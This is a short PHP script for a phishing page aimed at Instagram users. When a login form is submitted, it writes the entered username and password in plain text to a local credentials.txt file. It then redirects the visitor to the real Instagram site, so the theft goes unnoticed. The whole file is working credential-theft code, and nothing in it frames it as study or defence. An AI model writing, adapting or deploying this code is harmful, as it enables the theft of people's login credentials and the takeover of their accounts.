<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save to a file
    file_put_contents('credentials.txt', "Username: $username\nPassword: $password\n", FILE_APPEND);

    // Redirect to the real Instagram page
    header("Location: https://www.instagram.com");
    exit();
}
?>
